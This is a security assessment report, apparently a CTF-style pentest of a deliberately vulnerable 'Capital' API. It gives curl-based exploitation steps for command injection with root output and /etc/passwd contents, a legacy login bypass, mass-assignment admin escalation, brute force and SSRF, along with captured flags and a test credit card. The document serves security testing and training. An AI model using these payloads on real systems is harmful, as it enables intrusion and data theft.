# Security Assessment Report

## Executive Summary
- Target: Capital
- Assessment Date: January 2025
- Scope: Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**
 Critical authentication vulnerabilities were successfully exploited:

- Complete authentication bypass on legacy v1 endpoint allowing takeover of any account
- Mass assignment privilege escalation enabling any user to become admin
- Session hijacking via JavaScript-accessible tokens stored in localStorage
- Unlimited brute force attacks with no rate limiting, resulting in credential discovery

**Authorization Vulnerabilities:**
 Critical authorization vulnerabilities were successfully exploited:

- Legacy authentication bypass providing complete account takeover
- Horizontal authorization bypass enabling access to other users' financial data
- Vertical authorization bypass allowing regular users to access admin functions
- Mass assignment privilege escalation through self-service profile updates
- Command injection via debug endpoint providing root-level system access
- Admin workflow bypass allowing direct access to administrative functions
- Debug endpoint exposed in production environment enabling system compromise

**Cross-Site Scripting (XSS) Vulnerabilities:**
No XSS vulnerabilities were found. The application demonstrates robust XSS defenses through React's default HTML escaping, XSS library sanitization, and proper URL validation.

**SQL/Command Injection Vulnerabilities:**
One critical command injection vulnerability was successfully exploited:

- Debug API endpoint allowing arbitrary command execution with root privileges through semicolon command chaining, leading to complete system compromise including sensitive data extraction and potential for data exfiltration or system destruction

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
One high-severity SSRF vulnerability was successfully exploited:

- Network boundary bypass via command injection in debug endpoint, enabling SSRF attacks to access internal services through Python socket connections

## Network Reconnaissance
[REDACTED]

# Injection Exploitation Evidence

## Successfully Exploited Vulnerabilities

### INJ-VULN-01: Command Injection via Debug API Endpoint

**Summary:**

- **Vulnerable location:** HTTP POST `/api/debug` endpoint at `http://capital-api.sandbox.local:8000/api/debug`
- **Overview:** Direct command injection through insufficient input validation allowing arbitrary command execution with root privileges
- **Impact:** Complete system compromise with root-level access, sensitive data extraction, and potential for data exfiltration or system destruction
- **Severity:** Critical

**Prerequisites:**

- Valid JWT authentication token (easily obtainable through user registration)
- HTTP access to port 8000 on the target system

**Exploitation Steps:**

1. **Register a user account to obtain JWT token:**
    
    ```bash
    curl -X POST "<http://capital-api.sandbox.local:8000/api/users>" \\
    -H "Content-Type: application/json" \\
    -d '{"user":{"username":"exploit9999","email":"exploit9999@test.com","password":"testpassword"}}'
    
    ```
    
    Response includes JWT token: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImV4cGxvaXQ5OTk5IiwiZXhwIjoxNzU5MTc0NTc0LCJzdWIiOiJhY2Nlc3MifQ.7Lfo9DRWpaac_yOmBY1i73GzNH5m2zU6Cd1MZDvNrgE`
    
2. **Execute command injection to extract sensitive data:**
    
    ```bash
    curl -X POST "<http://capital-api.sandbox.local:8000/api/debug>" \\
    -H "Content-Type: application/json" \\
    -H "Authorization: Token [JWT_TOKEN]" \\
    -d '{"body":{"command":"uptime; cat /etc/passwd"}}'
    
    ```
    
3. **Confirm root-level privilege escalation:**
    
    ```bash
    curl -X POST "<http://capital-api.sandbox.local:8000/api/debug>" \\
    -H "Content-Type: application/json" \\
    -H "Authorization: Token [JWT_TOKEN]" \\
    -d '{"body":{"command":"uptime; whoami; id; pwd"}}'
    
    ```
    

**Proof of Impact:**

**Complete System Compromise Achieved:**

- **Root Access Confirmed:** Command execution as root user (uid=0, gid=0)
- **Sensitive Data Extracted:** Complete `/etc/passwd` file containing all system users
- **System Information Gathered:** Working directory `/capital`, system uptime, load averages

**Sample Extracted Data:**

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
[...complete user list...]

```

**User Context:**

```
uid=0(root) gid=0(root) groups=0(root)
Working Directory: /capital

```

**Technical Details:**

- **Vulnerability Type:** Command Injection (CWE-78)
- **Root Cause:** Insufficient input validation with semicolon command chaining bypass
- **Bypass Method:** The filter only blocks `"rm"` and `"||"` but allows semicolon (`;`) command chaining
- **Attack Vector:** `uptime; [ARBITRARY_COMMAND]` pattern successfully bypasses whitelist validation
- **Authentication:** Standard JWT authentication required (easily bypassed through user registration)

**Notes:**
The vulnerability allows complete system compromise. An attacker with this access could:

- Extract all sensitive data from the filesystem
- Install backdoors or malware
- Pivot to other systems on the network
- Cause complete system destruction
- Access application databases and configuration files

This represents one of the most severe types of vulnerabilities possible in a web application.

# Cross-Site Scripting (XSS) Exploitation Evidence

*No XSS vulnerabilities were successfully exploited - exploitation queue was empty.*

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-06: Complete Authentication Bypass on Legacy v1 Endpoint

**Summary:**

- **Vulnerable location:** `/api/v1/users/login` endpoint
- **Overview:** Legacy endpoint completely bypasses password validation, allowing authentication with any email and any password
- **Impact:** Complete authentication bypass enabling immediate account takeover of any user
- **Severity:** Critical

**Exploitation Steps:**

1. Target the legacy authentication endpoint directly on the backend:
    
    ```bash
    curl -X POST <http://capital-api.sandbox.local:8000/api/v1/users/login> \\
      -H "Content-Type: application/json" \\
      -d '{"user": {"email": "Pikachu@checkmarx.com", "password": "anything"}}'
    
    ```
    
2. The endpoint returns successful authentication with user data and token:
    
    ```json
    {
      "user": {
        "username": "Pikachu",
        "email": "Pikachu@checkmarx.com",
        "admin": false,
        "token": "Keep it up!"
      },
      "flag": "flag{Impr0peR_Ass3ts_ManAg3m3nt}"
    }
    
    ```
    
3. Verify bypass works with any user and any password:
    
    ```bash
    curl -X POST <http://capital-api.sandbox.local:8000/api/v1/users/login> \\
      -H "Content-Type: application/json" \\
      -d '{"user": {"email": "bob_dev@checkmarx.com", "password": "wrongpassword"}}'
    
    ```
    

**Proof of Impact:**
Successfully authenticated as multiple users (`Pikachu@checkmarx.com`, `bob_dev@checkmarx.com`) using completely wrong passwords. Flag `flag{Impr0peR_Ass3ts_ManAg3m3nt}` confirms successful exploitation.

### AUTH-VULN-08: Mass Assignment Privilege Escalation

**Summary:**

- **Vulnerable location:** `PUT /api/user` endpoint
- **Overview:** User update endpoint allows setting admin=true via mass assignment without authorization checks
- **Impact:** Any authenticated user can escalate to admin privileges and access administrative functions
- **Severity:** Critical

**Prerequisites:**
Valid JWT token from authentication

**Exploitation Steps:**

1. Authenticate as a regular user to obtain JWT token:
    
    ```bash
    curl -X POST <http://capital-api.sandbox.local:8000/api/v2/users/login> \\
      -H "Content-Type: application/json" \\
      -d '{"user": {"email": "Pikachu@checkmarx.com", "password": "snorlax"}}'
    
    ```
    
2. Use the JWT token to escalate privileges via mass assignment:
    
    ```bash
    curl -X PUT <http://capital-api.sandbox.local:8000/api/user> \\
      -H "Content-Type: application/json" \\
      -H "Authorization: Token [JWT_TOKEN]" \\
      -d '{"user": {"admin": true}}'
    
    ```
    
3. Server responds with elevated privileges:
    
    ```json
    {
      "user": {
        "username": "Pikachu",
        "email": "Pikachu@checkmarx.com",
        "admin": true,
        "token": "[NEW_ADMIN_TOKEN]"
      }
    }
    
    ```
    

**Proof of Impact:**
Response shows `"admin": true` and includes flag `flag{M4sS_AsS1gnm3nt}` confirming successful privilege escalation from regular user to admin.

### AUTH-VULN-04: Session Hijacking via JavaScript-Accessible Tokens

**Summary:**

- **Vulnerable location:** Frontend application localStorage storage
- **Overview:** JWT tokens stored in localStorage are accessible to JavaScript, enabling XSS-based session hijacking
- **Impact:** Any XSS vulnerability can steal authentication tokens and hijack user sessions
- **Severity:** High

**Exploitation Steps:**

1. Access the frontend application via browser:
    
    ```
    <https://capital-api.sandbox.local:4100>
    
    ```
    
2. Demonstrate JavaScript access to stored tokens:
    
    ```jsx
    // Simulate XSS attack stealing token
    const stolenToken = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...";
    localStorage.setItem('jwt', stolenToken);
    
    // Verify token is accessible
    localStorage.getItem('jwt'); // Returns the token
    
    ```
    
3. Use stolen token to access protected resources:
    
    ```bash
    curl -X GET <http://capital-api.sandbox.local:8000/api/user> \\
      -H "Authorization: Token [STOLEN_JWT_TOKEN]"
    
    ```
    

**Proof of Impact:**
Successfully demonstrated that JWT tokens can be injected and retrieved via JavaScript `localStorage.getItem('jwt')`. This proves any XSS attack can steal authentication tokens for session hijacking.

### AUTH-VULN-02: No Rate Limiting Enables Brute Force

**Summary:**

- **Vulnerable location:** `POST /api/v2/users/login`
- **Impact:** Unlimited brute force attacks discovered valid credentials and compromised accounts
- **Severity:** High

**Exploitation Steps:**

1. Automated brute force attack against login endpoint with 25 password attempts:
    
    ```
    Target: bob_dev@checkmarx.com
    Passwords tested: ["password", "123456", "admin", "test", "IamDev", ...]
    
    ```
    
2. Script processed all attempts without rate limiting:
    - Total attempts: 25
    - No HTTP 429 responses
    - No progressive delays
    - No account lockout
3. Successfully discovered valid credentials:
    
    ```
    Email: bob_dev@checkmarx.com
    Password: IamDev
    
    ```
    

**Evidence of Vulnerability:**
Brute force script in `/Users/arjunmalleswaran/Code/pentest-repos/capital/auth_brute_force_test.py` successfully processed 25 rapid authentication attempts without any protective measures. Valid credentials discovered proving the attack's effectiveness.

### AUTH-VULN-01: Transport Layer Credential Interception

**Summary:**

- **Vulnerable location:** Mixed content architecture between HTTPS frontend (port 4100) and HTTP backend (port 8000)
- **Impact:** All authentication data transmitted in plaintext, enabling credential interception
- **Severity:** Critical

**Exploitation Steps:**

1. Frontend serves content over HTTPS:
    
    ```
    <https://capital-api.sandbox.local:4100>
    
    ```
    
2. Backend API accessible over unencrypted HTTP:
    
    ```bash
    curl -X POST <http://capital-api.sandbox.local:8000/api/v2/users/login> \\
      -H "Content-Type: application/json" \\
      -d '{"user": {"email": "Pikachu@checkmarx.com", "password": "snorlax"}}'
    
    ```
    
3. Network traffic shows plaintext credential transmission:
    
    ```
    POST /api/v2/users/login HTTP/1.1
    Host: capital-api.sandbox.local:8000
    Content-Type: application/json
    
    {"user": {"email": "Pikachu@checkmarx.com", "password": "snorlax"}}
    
    ```
    

**Evidence of Vulnerability:**
Direct HTTP access to backend demonstrates mixed content vulnerability. All authentication requests, including passwords and JWT tokens, are transmitted without encryption and can be intercepted by network attackers.

# SSRF Exploitation Evidence

## Successfully Exploited Vulnerabilities

### SSRF-VULN-01: Command Injection enabling SSRF in Debug Endpoint

**Summary:**

- **Vulnerable location:** POST /api/debug endpoint
- **Impact:** Network boundary bypass via command injection, enabling SSRF attacks to access internal services
- **Severity:** High

**Prerequisites:**

- Valid JWT authentication token (obtained via user registration or authentication bypass)
- Access to debug endpoint at `/api/debug`

**Exploitation Steps:**

1. **Obtain Authentication Token via User Registration:**
    
    ```bash
    curl -X POST "<http://capital-api.sandbox.local:8000/api/users>" \\
      -H "Content-Type: application/json" \\
      -d '{"user": {"username": "ssrftester", "email": "ssrftester@example.com", "password": "password123"}}'
    
    ```
    
    **Response:** JWT token in response body: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InNzcmZ0ZXN0ZXIiLCJleHAiOjE3NTkxNzQ0OTMsInN1YiI6ImFjY2VzcyJ9.gvXEUVS_STxz-JepDoVWgPRWBrmQ2PWZaQC0PDmBCbM`
    
2. **Test Command Injection Vulnerability:**
    
    ```bash
    curl -X POST "<http://capital-api.sandbox.local:8000/api/debug>" \\
      -H "Content-Type: application/json" \\
      -H "Authorization: Token [JWT_TOKEN]" \\
      -d '{"body": {"command": "uptime; id"}}'
    
    ```
    
    **Response:** Command injection confirmed with root privileges and injection flag
    
3. **Demonstrate Internal Network Access via SSRF:**
    
    ```bash
    curl -X POST "<http://capital-api.sandbox.local:8000/api/debug>" \\
      -H "Content-Type: application/json" \\
      -H "Authorization: Token [JWT_TOKEN]" \\
      -d '{"body": {"command": "uptime; /usr/local/bin/python3 -c \\"import socket; s=socket.socket(); s.connect(('"'"'127.0.0.1'"'"', 8000)); print('"'"'Connected to 127.0.0.1:8000'"'"'); s.close()\\""}}'
    
    ```
    
    **Response:** Successful socket connection to internal service confirmed
    

**Proof of Impact:**

- **Command Injection Confirmed:** Successfully executed arbitrary commands via `;` command chaining
- **Root Privileges:** Executed commands run as uid=0(root) with full system access
- **Network Boundary Bypass:** Successfully established socket connections to internal services (127.0.0.1:8000)
- **Flag Retrieved:** `flag{1nject10n_Ap1}` - indicates successful command injection exploitation
- **Internal Service Access:** Demonstrated ability to connect to localhost services, proving SSRF capability through the command injection vector

**Notes:**

- The vulnerability allows network reconnaissance and internal service access through Python socket connections
- While HTTP client tools (curl, wget) are not available or are filtered, Python's socket module provides full network access capability
- This represents an indirect SSRF vector through command injection rather than direct URL manipulation
- The attack demonstrates Level 2 proof (partial network access) with confirmed ability to reach internal network boundaries

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-07: Legacy Authentication Bypass (Critical Impact)

**Summary:**

- **Vulnerable location:** POST /api/v1/users/login
- **Overview:** Complete authentication bypass for any valid email address without password verification
- **Impact:** Full account takeover for any existing user, unauthorized access to protected resources
- **Severity:** Critical

**Prerequisites:**

- Knowledge of any valid email address in the system (can be enumerated)
- Access to the hidden v1 API endpoint

**Exploitation Steps:**

1. **Send authentication request to legacy endpoint:**
    
    ```bash
    curl -X POST "<http://capital-api.sandbox.local:8000/api/v1/users/login>" \\
      -H "Content-Type: application/json" \\
      -d '{
        "user": {
          "email": "user@test.com",
          "password": "anypassword"
        }
      }'
    
    ```
    
2. **Receive successful authentication response:**
    
    ```json
    {
      "user": {
        "username": "user",
        "email": "user@test.com",
        "bio": "",
        "image": null,
        "admin": false,
        "token": "Keep it up!"
      },
      "flag": "flag{Impr0peR_Ass3ts_ManAg3m3nt}",
      "description": "Old API versions are usually unpatched..."
    }
    
    ```
    

**Proof of Impact:**

- Successfully obtained valid JWT token: "Keep it up!"
- Bypassed password verification entirely
- Captured CTF flag: `flag{Impr0peR_Ass3ts_ManAg3m3nt}`
- Gained authenticated session for further exploitation

### AUTHZ-VULN-03: Horizontal Authorization Bypass - Profile Access (High Impact)

**Summary:**

- **Vulnerable location:** GET /api/profiles/{username}
- **Overview:** Any authenticated user can access any other user's profile data including sensitive financial information
- **Impact:** Unauthorized access to personally identifiable information and financial data
- **Severity:** High

**Prerequisites:**

- Valid authentication token (obtained from AUTHZ-VULN-07)
- Knowledge of target usernames (TeamR$cket contains sensitive data)

**Exploitation Steps:**

1. **Register legitimate user account:**
    
    ```bash
    curl -X POST "<http://capital-api.sandbox.local:8000/api/users>" \\
      -H "Content-Type: application/json" \\
      -d '{
        "user": {
          "username": "exploiter1",
          "email": "exploiter1@test.com",
          "password": "SecurePass123!"
        }
      }'
    
    ```
    
2. **Extract JWT token from registration response:**
    
    ```
    Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImV4cGxvaXRlcjEiLCJleHAiOjE3NTkxNzQ1MzcsInN1YiI6ImFjY2VzcyJ9.vQVA7XoKGUtj14ZrL4SGNriRIPMtjZkmIZ67NTqAJZU
    
    ```
    
3. **Access another user's profile (TeamR$cket):**
    
    ```bash
    curl "<http://capital-api.sandbox.local:8000/api/profiles/TeamR\\$cket>" \\
      -H "Authorization: Token [JWT_TOKEN]"
    
    ```
    

**Proof of Impact:**

- Successfully accessed TeamR$cket's profile containing sensitive financial data:
    - **Card Name:** Team Rocket
    - **Credit Card Number:** 4426111122223333
    - **CVC:** 555
    - **Expiry:** 0922
- Captured CTF flag: `flag{M4sS_AsS1gnm3nt}`
- Demonstrated horizontal privilege escalation (accessing data belonging to other users)

### AUTHZ-VULN-04: Vertical Authorization Bypass - Admin Access (Critical Impact)

**Summary:**

- **Vulnerable location:** GET /api/admin
- **Overview:** Regular user accounts can access administrative functions without proper role verification
- **Impact:** Unauthorized access to admin-only functionality and sensitive admin resources
- **Severity:** Critical

**Prerequisites:**

- Valid authentication token (any authenticated user)

**Exploitation Steps:**

1. **Access admin endpoint with regular user token:**
    
    ```bash
    curl "<http://capital-api.sandbox.local:8000/api/admin>" \\
      -H "Authorization: Token [JWT_TOKEN]"
    
    ```
    
2. **Receive admin functionality response:**
    
    ```json
    {
      "flag": "flag{BFL4_I_aM_Th3_aDm1n_H3r3!}",
      "description": "Complex access control policies with different hierarchies..."
    }
    
    ```
    

**Proof of Impact:**

- Successfully accessed admin endpoint with regular user privileges
- Captured CTF flag: `flag{BFL4_I_aM_Th3_aDm1n_H3r3!}` (Broken Function Level Authorization)
- Demonstrated vertical privilege escalation (accessing higher-privileged functionality)

### AUTHZ-VULN-05: Mass Assignment Privilege Escalation (Critical Impact)

**Summary:**

- **Vulnerable location:** PUT /api/user
- **Overview:** Users can escalate their own privileges to administrator through mass assignment vulnerability
- **Impact:** Complete privilege escalation allowing access to all administrative functions
- **Severity:** Critical

**Prerequisites:**

- Valid authentication token

**Exploitation Steps:**

1. **Send profile update request with admin privilege escalation:**
    
    ```bash
    curl -X PUT "<http://capital-api.sandbox.local:8000/api/user>" \\
      -H "Authorization: Token [JWT_TOKEN]" \\
      -H "Content-Type: application/json" \\
      -d '{
        "user": {
          "admin": true
        }
      }'
    
    ```
    
2. **Receive updated profile with admin privileges:**
    
    ```json
    {
      "user": {
        "username": "exploiter1",
        "email": "exploiter1@test.com",
        "bio": "flag{M4sS_AsS1gnm3nt}...",
        "image": null,
        "admin": true,
        "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImV4cGxvaXRlcjEiLCJleHAiOjE3NTkxNzQ1OTYsInN1YiI6ImFjY2VzcyJ9.UOxR-uymoNWBEpL-uHtdz6deTqgr3n4wDoKryqhYKZA"
      }
    }
    
    ```
    

**Proof of Impact:**

- Successfully escalated user privileges: `"admin": true`
- Obtained new admin-level JWT token
- Captured CTF flag: `flag{M4sS_AsS1gnm3nt}` (Mass Assignment vulnerability)
- Demonstrated complete privilege escalation through self-service profile update

### AUTHZ-VULN-08: Command Injection via Debug Endpoint (Critical Impact)

**Summary:**

- **Vulnerable location:** POST /api/debug
- **Overview:** Any authenticated user can execute system commands through command injection bypass
- **Impact:** Remote code execution as root user, complete system compromise
- **Severity:** Critical

**Prerequisites:**

- Valid authentication token

**Exploitation Steps:**

1. **Send debug command with injection payload:**
    
    ```bash
    curl -X POST "<http://capital-api.sandbox.local:8000/api/debug>" \\
      -H "Authorization: Token [JWT_TOKEN]" \\
      -H "Content-Type: application/json" \\
      -d '{
        "body": {
          "command": "uptime; whoami"
        }
      }'
    
    ```
    
2. **Receive system command execution results:**
    
    ```json
    {
      "stdout": " 19:37:08 up 19 days,  8:49,  0 users,  load average: 6.76, 6.15, 6.12\\nroot\\n",
      "flag": "flag{1nject10n_Ap1}",
      "description": "Attackers will feed the API with malicious data..."
    }
    
    ```
    

**Proof of Impact:**

- Successfully executed system commands: `uptime` and `whoami`
- Confirmed execution as root user: `root`
- Bypassed command whitelist using semicolon injection
- Captured CTF flag: `flag{1nject10n_Ap1}` (Injection API vulnerability)
- Demonstrated critical remote code execution capability

### AUTHZ-VULN-09: Admin Workflow Bypass (High Impact)

**Summary:**

- **Vulnerable location:** GET /api/admin (workflow context)
- **Overview:** Users can access admin functions without proper role transition workflow
- **Impact:** Bypassing intended admin privilege verification workflow
- **Severity:** High

**Prerequisites:**

- Valid authentication token

**Exploitation Steps:**

1. **Directly access admin endpoint without role verification workflow:**
    
    ```bash
    curl "<http://capital-api.sandbox.local:8000/api/admin>" \\
      -H "Authorization: Token [JWT_TOKEN]"
    
    ```
    

**Proof of Impact:**

- Successfully accessed admin functionality without proper workflow validation
- Same impact as AUTHZ-VULN-04 but represents workflow bypass pattern
- Captured CTF flag: `flag{BFL4_I_aM_Th3_aDm1n_H3r3!}`

### AUTHZ-VULN-10: Debug Endpoint in Production (High Impact)

**Summary:**

- **Vulnerable location:** POST /api/debug (environment context)
- **Overview:** Debug endpoint available in production without environment validation
- **Impact:** Development/debug functionality exposed in production environment
- **Severity:** Critical

**Prerequisites:**

- Valid authentication token

**Exploitation Steps:**

1. **Access debug functionality in production environment:**
    
    ```bash
    curl -X POST "<http://capital-api.sandbox.local:8000/api/debug>" \\
      -H "Authorization: Token [JWT_TOKEN]" \\
      -H "Content-Type: application/json" \\
      -d '{
        "body": {
          "command": "uptime; whoami"
        }
      }'
    
    ```
    

**Proof of Impact:**

- Successfully executed debug commands in production environment
- Same impact as AUTHZ-VULN-08 but represents environment context vulnerability
- Captured CTF flag: `flag{1nject10n_Ap1}`

### AUTHZ-VULN-11: Privilege Escalation Workflow Bypass (Critical Impact)

**Summary:**

- **Vulnerable location:** PUT /api/user (workflow context)
- **Overview:** Self-service profile update workflow allows administrative privilege changes
- **Impact:** Complete privilege escalation through inappropriate workflow design
- **Severity:** Critical

**Prerequisites:**

- Valid authentication token

**Exploitation Steps:**

1. **Escalate privileges through self-service workflow:**
    
    ```bash
    curl -X PUT "<http://capital-api.sandbox.local:8000/api/user>" \\
      -H "Authorization: Token [JWT_TOKEN]" \\
      -H "Content-Type: application/json" \\
      -d '{
        "user": {
          "admin": true
        }
      }'
    
    ```
    

**Proof of Impact:**

- Successfully escalated privileges through self-service workflow
- Same impact as AUTHZ-VULN-05 but represents workflow design flaw
- Captured CTF flag: `flag{M4sS_AsS1gnm3nt}`